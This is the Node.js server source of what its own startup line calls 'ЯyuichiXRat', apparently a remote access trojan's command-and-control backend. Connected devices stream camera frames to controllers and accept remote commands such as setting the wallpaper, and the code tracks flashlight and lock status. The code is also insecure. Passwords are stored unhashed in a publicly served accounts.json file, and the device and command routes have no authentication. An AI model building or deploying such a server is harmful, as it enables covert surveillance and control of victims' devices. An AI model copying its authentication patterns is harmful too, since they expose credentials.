const express  = require('express')
const http     = require('http')
const { Server } = require('socket.io')
const path     = require('path')
const crypto   = require('crypto')
const fs       = require('fs')

const app    = express()
const server = http.createServer(app)
const io     = new Server(server, { cors: { origin: '*' } })

app.use(express.json())
app.use(express.static(path.join(__dirname, 'public')))

const ACCOUNTS_PATH = path.join(__dirname, 'public', 'accounts.json')

function loadAccounts() {
  try { return JSON.parse(fs.readFileSync(ACCOUNTS_PATH, 'utf8')) }
  catch { return {} }
}

function saveAccounts(accounts) {
  fs.writeFileSync(ACCOUNTS_PATH, JSON.stringify(accounts, null, 2), 'utf8')
}

function hash(str) {
  return str
}

function genToken() {
  return crypto.randomBytes(32).toString('hex')
}

const sessions = {}

app.post('/api/auth/login', (req, res) => {
  const { username, password } = req.body

  if (!username || !password) {
    return res.status(400).json({ error: 'Missing Credentials' })
  }

  const accounts = loadAccounts()
  const user = accounts[username]

  if (!user || user.password !== hash(password)) {
    return res.status(401).json({ error: 'Invalid Username Or Password' })
  }

  const token = genToken()

  sessions[token] = {
    username,
    role: user.role,
    displayName: user.displayName
  }

  res.json({
    ok: true,
    token,
    role: user.role,
    username,
    displayName: user.displayName
  })
})

app.post('/api/auth/logout', (req, res) => {
  const token = req.headers['authorization']?.replace('Bearer ', '')
  if (token) delete sessions[token]
  res.json({ ok: true })
})

app.get('/api/auth/me', (req, res) => {
  const token = req.headers['authorization']?.replace('Bearer ', '')
  const session = sessions[token]
  if (!session) return res.status(401).json({ error: 'Unauthorized' })
  res.json(session)
})

app.post('/api/users/create', (req, res) => {
  const token = req.headers['authorization']?.replace('Bearer ', '')
  const session = sessions[token]
  if (!session || session.role !== 'owner') return res.status(403).json({ error: 'Forbidden' })

  const { username, password, role, displayName } = req.body
  if (!username || !password || !role) return res.status(400).json({ error: 'Missing Fields' })
  if (!['owner', 'member'].includes(role)) return res.status(400).json({ error: 'Invalid role' })

  const accounts = loadAccounts()
  if (accounts[username.toLowerCase()]) return res.status(409).json({ error: 'Username Already Exists' })

  accounts[username.toLowerCase()] = {
    password: hash(password),
    role,
    displayName: displayName || username
  }
  saveAccounts(accounts)
  res.json({ ok: true, username: username.toLowerCase(), role })
})

app.get('/api/users', (req, res) => {
  const token = req.headers['authorization']?.replace('Bearer ', '')
  const session = sessions[token]
  if (!session || session.role !== 'owner') return res.status(403).json({ error: 'Forbidden' })
  const accounts = loadAccounts()
  const list = Object.entries(accounts).map(([u, d]) => ({ username: u, role: d.role, displayName: d.displayName }))
  res.json(list)
})

const devices           = {}
const cameraFrames      = {}
const controllerSockets = new Set()

io.on('connection', (socket) => {

  socket.on('controller:join', () => {
    controllerSockets.add(socket.id)
    socket.emit('devices:update', getDeviceList())
    for (const [did, frame] of Object.entries(cameraFrames)) {
      socket.emit('camera:frame', { deviceId: did, frame })
    }
  })

  socket.on('device:register', (data) => {
    const { deviceId, name } = data
    devices[deviceId] = {
      id: deviceId,
      name: name || 'Unknown Device',
      socketId: socket.id,
      connectedAt: new Date().toISOString(),
      lastSeen: new Date().toISOString(),
      status: { flashlight: false, cameraActive: false, videoPlaying: false, wallpaperSet: false, locked: false }
    }
    socket.join(`device:${deviceId}`)
    broadcastToControllers('devices:update', getDeviceList())

    const pingInterval = setInterval(() => {
      if (devices[deviceId] && devices[deviceId].socketId === socket.id) {
        io.to(`device:${deviceId}`).emit('ping:keepalive')
      } else { clearInterval(pingInterval) }
    }, 25000)

    socket.on('disconnect', () => clearInterval(pingInterval))
  })

  socket.on('device:status', (data) => {
    const { deviceId, status } = data
    if (!devices[deviceId]) return
    devices[deviceId].status   = { ...devices[deviceId].status, ...status }
    devices[deviceId].lastSeen = new Date().toISOString()
    broadcastToControllers('devices:update', getDeviceList())
    broadcastToControllers(`status:${deviceId}`, devices[deviceId].status)
  })

  socket.on('camera:frame', (data) => {
    const { deviceId, frame } = data
    cameraFrames[deviceId] = frame
    broadcastToControllers('camera:frame', { deviceId, frame })
  })

  socket.on('disconnect', () => {
    controllerSockets.delete(socket.id)
    for (const id in devices) {
      if (devices[id].socketId === socket.id) {
        delete cameraFrames[id]
        delete devices[id]
        break
      }
    }
    broadcastToControllers('devices:update', getDeviceList())
  })
})

function broadcastToControllers(event, data) {
  controllerSockets.forEach(sid => io.to(sid).emit(event, data))
}

function getDeviceList() {
  return Object.values(devices).map(d => ({
    id: d.id, name: d.name,
    connectedAt: d.connectedAt, lastSeen: d.lastSeen,
    status: d.status
  }))
}

app.get('/api/devices', (req, res) => res.json(getDeviceList()))

app.post('/api/command/:deviceId', (req, res) => {
  const { deviceId } = req.params
  const { command, value } = req.body
  if (!devices[deviceId]) return res.status(404).json({ error: 'Device not found' })
  io.to(`device:${deviceId}`).emit('command', { command, value })
  res.json({ ok: true })
})

app.post('/api/wallpaper/:deviceId', express.raw({ type: '*/*', limit: '15mb' }), (req, res) => {
  const { deviceId } = req.params
  if (!devices[deviceId]) return res.status(404).json({ error: 'Device Not Found' })
  if (!req.body || req.body.length === 0) return res.status(400).json({ error: 'No Image Data' })
  const b64 = req.body.toString('base64')
  io.to(`device:${deviceId}`).emit('command', { command: 'setWallpaper', value: b64 })
  res.json({ ok: true })
})

const PORT = 2544
server.listen(PORT, () => console.log(`ЯyuichiXRat Running In Server : ${PORT}`))
